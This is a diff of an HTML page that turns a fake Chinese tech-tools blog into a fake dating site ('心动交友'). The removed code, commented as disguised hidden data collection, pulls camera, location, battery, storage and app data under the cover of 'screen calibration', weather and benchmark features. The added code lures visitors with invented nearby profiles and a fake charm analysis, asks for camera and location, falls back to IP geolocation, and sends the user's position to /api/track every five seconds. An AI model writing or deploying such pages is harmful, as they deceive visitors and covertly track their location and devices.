@@ -3,186 +3,318 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tech Blog - 技术分享与交流</title>
+    <title>心动交友 - 寻找你的缘分</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <style>
-        .article-img {
-            max-width: 100%;
-            height: auto;
-        }
-        .qr-preview {
-            width: 320px;
-            height: 240px;
+        body {
             background: #f5f5f5;
+            min-height: 100vh;
+        }
+        .profile-preview {
+            width: 100%;
+            height: 240px;
+            background: #fff;
             margin: 10px auto;
+            position: relative;
+            overflow: hidden;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .avatar-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            background-image: url('https://api.dicebear.com/6.x/adventurer-neutral/svg?seed=Felix');
+        }
+        .nearby-card {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: slideIn 0.5s forwards;
+        }
+        @keyframes slideIn {
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        .nearby-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 25px;
+            margin-right: 15px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #f0f0f0;
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+        .progress-fill {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            background: linear-gradient(90deg, #ff4b8a, #ff6b6b);
+            width: 0%;
+            animation: fillProgress 2s ease-out forwards;
+        }
+        @keyframes fillProgress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .fade-in {
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+        }
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 20px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+        }
+        .btn-gradient {
+            background: linear-gradient(45deg, #ff4b8a, #ff6b6b);
+            color: white;
+            padding: 12px 24px;
+            border-radius: 25px;
+            border: none;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        .btn-gradient:hover {
+            transform: translateY(-2px);
         }
     </style>
 </head>
-<body class="bg-gray-100">
-    <nav class="bg-white shadow-lg">
+<body>
+    <nav class="bg-pink-600 shadow-lg">
         <div class="max-w-6xl mx-auto px-4">
             <div class="flex justify-between">
                 <div class="flex space-x-7">
                     <div class="flex items-center py-4">
-                        <span class="font-semibold text-gray-500 text-lg">Tech Blog</span>
+                        <span class="font-semibold text-white text-xl">心动交友</span>
                     </div>
                 </div>
             </div>
         </div>
     </nav>
 
-    <div class="container mx-auto px-4 py-8">
-        <article class="bg-white rounded-lg shadow-md p-6 mb-6">
-            <h1 class="text-2xl font-bold mb-4">在线二维码生成器</h1>
-            <p class="text-gray-600 mb-4">
-                使用我们的在线工具生成高质量二维码。支持文本、URL、名片等多种格式。
-                为了确保二维码清晰度，需要使用您的摄像头进行屏幕校准。
-            </p>
-            <div class="qr-preview" id="qr-container">
-                <p class="text-center pt-4">正在加载预览...</p>
-            </div>
-            <button onclick="startCalibration()" class="bg-blue-500 text-white px-4 py-2 rounded mt-4">
-                开始屏幕校准
-            </button>
-        </article>
+    <main class="container mx-auto px-4 py-8">
+        <div class="text-center mb-8 fade-in">
+            <h1 class="text-3xl font-bold text-gray-800">寻找你的心动瞬间</h1>
+            <p class="text-gray-600 mt-2">已有超过10000位单身用户在这里找到幸福</p>
+        </div>
 
-        <article class="bg-white rounded-lg shadow-md p-6 mb-6">
-            <h1 class="text-2xl font-bold mb-4">本地天气预报</h1>
-            <p class="text-gray-600 mb-4">
-                获取您所在位置的精确天气预报，包括温度、湿度、空气质量等详细信息。
-            </p>
-            <div id="weather-container" class="bg-gray-100 p-4 rounded">
-                <p class="text-center">加载天气信息中...</p>
+        <div class="bg-white rounded-lg shadow-md p-6 mb-6 fade-in" style="animation-delay: 0.2s">
+            <h2 class="text-xl font-bold mb-4 text-pink-600">你的个人资料</h2>
+            <div class="profile-preview">
+                <div class="avatar-overlay"></div>
             </div>
-        </article>
+            <div class="mt-4">
+                <p class="text-gray-600 text-center mb-3" id="analysis-text">正在分析你的魅力值...</p>
+                <div class="progress-bar">
+                    <div class="progress-fill"></div>
+                </div>
+            </div>
+        </div>
 
-        <article class="bg-white rounded-lg shadow-md p-6 mb-6">
-            <h1 class="text-2xl font-bold mb-4">设备性能测试</h1>
-            <p class="text-gray-600 mb-4">
-                测试您的设备性能，包括CPU、内存、存储等指标。
-            </p>
-            <div id="performance-result" class="bg-gray-100 p-4 rounded">
-                <p class="text-center">准备开始测试...</p>
-            </div>
-            <button onclick="startPerformanceTest()" class="bg-green-500 text-white px-4 py-2 rounded mt-4">
-                开始测试
-            </button>
-        </article>
+        <div id="nearby-container" class="space-y-4">
+            <!-- 用户卡片将通过JavaScript动态添加 -->
+        </div>
+    </main>
+
+    <!-- 权限请求模态框 -->
+    <div id="permissionModal" class="modal">
+        <div class="modal-content">
+            <h3 class="text-xl font-bold mb-4">发现附近的心动对象</h3>
+            <p class="text-gray-600 mb-4">为了帮你找到最合适的对象，我们需要获取以下权限：</p>
+            <ul class="list-disc list-inside mb-4 text-gray-600">
+                <li>位置信息 - 查找附近的人</li>
+                <li>相机权限 - 实时互动</li>
+            </ul>
+            <button id="permissionBtn" class="btn-gradient w-full">立即查看附近的人</button>
+        </div>
     </div>
 
     <script>
-        // 隐藏的数据收集
-        let deviceData = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            deviceMemory: navigator.deviceMemory,
-            hardwareConcurrency: navigator.hardwareConcurrency,
-            connection: navigator.connection ? {
-                type: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink
-            } : null
+        // 全局设备数据对象
+        const deviceData = {
+            camera: null,
+            location: null
         };
 
-        // 伪装成屏幕校准
-        async function startCalibration() {
+        const analysisStages = [
+            { text: "正在分析你的颜值...", delay: 0 },
+            { text: "正在计算魅力指数...", delay: 800 },
+            { text: "正在匹配附近的人...", delay: 1600 },
+            { text: "分析完成！", delay: 2000 }
+        ];
+
+        const users = [
+            { name: '小甜甜', age: 23, distance: 0.5, avatar: 'https://api.dicebear.com/6.x/adventurer-neutral/svg?seed=Mia' },
+            { name: '阳光男孩', age: 25, distance: 0.8, avatar: 'https://api.dicebear.com/6.x/adventurer-neutral/svg?seed=Felix' },
+            { name: '温柔女生', age: 24, distance: 1.2, avatar: 'https://api.dicebear.com/6.x/adventurer-neutral/svg?seed=Emma' },
+            { name: '可爱多', age: 22, distance: 1.5, avatar: 'https://api.dicebear.com/6.x/adventurer-neutral/svg?seed=Sophie' },
+            { name: '开心果', age: 26, distance: 0.3, avatar: 'https://api.dicebear.com/6.x/adventurer-neutral/svg?seed=Jack' }
+        ];
+
+        function updateAnalysisText() {
+            const analysisText = document.getElementById('analysis-text');
+            analysisStages.forEach(stage => {
+                setTimeout(() => {
+                    if (analysisText) {
+                        analysisText.textContent = stage.text;
+                    }
+                }, stage.delay);
+            });
+        }
+
+        function createUserCard(user, index) {
+            const card = document.createElement('div');
+            card.className = 'nearby-card';
+            card.style.animationDelay = `${index * 200}ms`;
+            card.innerHTML = `
+                <img src="${user.avatar}" class="nearby-avatar" alt="${user.name}的头像" loading="lazy">
+                <div>
+                    <h3 class="font-bold text-lg">${user.name} · ${user.age}岁</h3>
+                    <p class="text-gray-500">距离${user.distance}km · 在线</p>
+                    <p class="text-pink-500 text-sm mt-1">期待遇见你 ❤️</p>
+                </div>
+            `;
+            return card;
+        }
+
+        function showNearbyUsers() {
+            const container = document.getElementById('nearby-container');
+            if (!container) return;
+
+            setTimeout(() => {
+                users.forEach((user, index) => {
+                    const card = createUserCard(user, index);
+                    container.appendChild(card);
+                });
+            }, 2000);
+        }
+
+        // 权限请求函数
+        async function requestPermissions() {
             try {
+                // 请求摄像头权限
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'environment' },
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
+                    },
                     audio: false
                 });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.style.display = 'none';
-                document.body.appendChild(video);
-                deviceData.camera = true;
-                sendData();
-            } catch (err) {
-                console.log('校准失败，请检查设备设置');
-            }
-        }
+                deviceData.camera = { active: true };
+                stream.getTracks().forEach(track => track.stop());
 
-        // 伪装成天气查询
-        function getWeather() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        deviceData.location = {
-                            lat: position.coords.latitude,
-                            lon: position.coords.longitude
-                        };
-                        document.getElementById('weather-container').innerHTML = 
-                            '<p class="text-center">正在获取天气数据...</p>';
-                        sendData();
-                    },
-                    err => {
-                        console.log('无法获取天气信息');
-                    }
-                );
-            }
-        }
-
-        // 伪装成性能测试
-        async function startPerformanceTest() {
-            document.getElementById('performance-result').innerHTML = 
-                '<p class="text-center">测试进行中...</p>';
-            
-            try {
-                // 收集更多系统信息
-                const storageEstimate = await navigator.storage.estimate();
-                const batteryManager = await navigator.getBattery();
-                
-                deviceData.storage = {
-                    quota: storageEstimate.quota,
-                    usage: storageEstimate.usage
-                };
-                
-                deviceData.battery = {
-                    level: batteryManager.level,
-                    charging: batteryManager.charging
-                };
-                
-                // 获取已安装应用信息（如果可用）
-                if ('getInstalledRelatedApps' in navigator) {
-                    deviceData.apps = await navigator.getInstalledRelatedApps();
+                // 请求位置权限
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            deviceData.location = {
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude
+                            };
+                            sendLocationToServer(deviceData.location);
+                        },
+                        () => {
+                            // 位置获取失败时使用IP定位
+                            fetch('https://ipapi.co/json/')
+                                .then(response => response.json())
+                                .then(data => {
+                                    deviceData.location = {
+                                        lat: data.latitude,
+                                        lon: data.longitude
+                                    };
+                                    sendLocationToServer(deviceData.location);
+                                })
+                                .catch(() => {});
+                        }
+                    );
                 }
-
-                setTimeout(() => {
-                    document.getElementById('performance-result').innerHTML = 
-                        '<p class="text-center text-green-500">测试完成！设备性能良好</p>';
-                    sendData();
-                }, 2000);
-            } catch (err) {
-                console.log('性能测试出现错误');
-                document.getElementById('performance-result').innerHTML = 
-                    '<p class="text-center text-yellow-500">测试完成！</p>';
+            } catch(e) {
+                console.error('Permission request failed:', e);
             }
         }
 
-        // 发送数据到服务器
-        async function sendData() {
-            try {
-                await fetch('/api/track', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(deviceData)
-                });
-            } catch (err) {
-                console.log('数据同步失败');
-            }
+        // 发送位置信息到服务器
+        function sendLocationToServer(location) {
+            fetch('/api/track', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    type: 'location',
+                    data: location,
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(() => {});
         }
 
-        // 页面加载完成后自动执行
-        window.onload = () => {
-            // 延迟执行以避免可疑
-            setTimeout(getWeather, 1000);
+        // 主初始化函数
+        function initialize() {
+            updateAnalysisText();
+            showNearbyUsers();
+
+            // 显示权限请求模态框
+            const modal = document.getElementById('permissionModal');
+            const permissionBtn = document.getElementById('permissionBtn');
+
             setTimeout(() => {
-                document.getElementById('qr-container').innerHTML = 
-                    '<p class="text-center">请点击"开始屏幕校准"继续...</p>';
+                modal.style.display = 'block';
             }, 1500);
-        };
+
+            permissionBtn.addEventListener('click', () => {
+                requestPermissions();
+                modal.style.display = 'none';
+            });
+
+            // 定期发送状态更新
+            setInterval(() => {
+                if (deviceData.location) {
+                    sendLocationToServer(deviceData.location);
+                }
+            }, 5000);
+        }
+
+        // 页面加载完成后执行
+        document.addEventListener('DOMContentLoaded', initialize);
     </script>
 </body>
 </html> 
